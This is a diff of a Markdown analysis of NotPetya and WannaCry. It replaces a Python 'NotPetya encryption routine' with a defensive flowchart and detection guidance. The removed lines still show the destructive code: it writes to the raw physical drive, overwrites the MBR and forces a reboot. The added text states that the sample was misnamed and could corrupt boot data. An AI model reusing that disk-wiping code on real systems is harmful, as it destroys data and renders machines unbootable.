@@ -1511,49 +1511,22 @@ NotPetya vs WannaCry:
 └─────────────────┴──────────────────┴──────────────────┘
 ```
 
-### Attack Code Analysis
+### Impact and Defensive Analysis
 
-```python
-# NotPetya encryption routine (simplified)
+The earlier sample is removed because it opened the raw first physical drive, read and rewrote its first mebibyte, attempted to overwrite boot data, and forced a reboot. That does not encrypt the Master File Table (MFT), as the original function name claimed, and running it with sufficient privileges could corrupt a real system's boot and partition data.
 
-import os
-from Crypto.Cipher import AES
-import hashlib
+NotPetya's destructive impact is best understood as a sequence of system changes and response opportunities, not as a runnable demonstration. The simplified model below is conceptual; it is not an implementation guide.
 
-def encrypt_mft():
-    """Encrypt Master File Table"""
-    # Read MFT
-    with open('\\\\.\\PhysicalDrive0', 'rb') as drive:
-        mft = drive.read(1024 * 1024)  # Read first 1MB
-    
-    # Generate encryption key
-    key = os.urandom(32)
-    
-    # Encrypt MFT
-    cipher = AES.new(key, AES.MODE_CBC)
-    encrypted_mft = cipher.encrypt(mft)
-    
-    # Overwrite MBR with custom bootloader
-    overwrite_mbr()
-    
-    # Write encrypted MFT back
-    with open('\\\\.\\PhysicalDrive0', 'wb') as drive:
-        drive.write(encrypted_mft)
-    
-    # Display ransom note
-    display_ransom_note()
-    
-    # Reboot system
-    os.system('shutdown /r /t 0')
-
-def overwrite_mbr():
-    """Replace MBR with ransomware bootloader"""
-    custom_mbr = b"\x33\xc0\x8e\xd0\xbc..."  # Custom bootloader
-    
-    with open('\\\\.\\PhysicalDrive0', 'r+b') as drive:
-        drive.seek(0)
-        drive.write(custom_mbr)
+```mermaid
+flowchart LR
+    Execution[Untrusted code executes] --> Disk[Attempts destructive disk or boot metadata changes]
+    Disk --> Alert[Endpoint and storage telemetry]
+    Alert --> Isolate[Isolate host and preserve evidence]
+    Isolate --> Restore[Recover from verified backups]
+    Restore --> Review[Review access, patching, and recovery gaps]
 ```
+
+Defenders should alert on unexpected raw-disk access, boot-configuration changes, unapproved encryption behavior, and forced restart patterns. Use a disposable VM snapshot and synthetic files for training; do not write to physical disks or boot sectors.
 
 ### Detection & Response
 
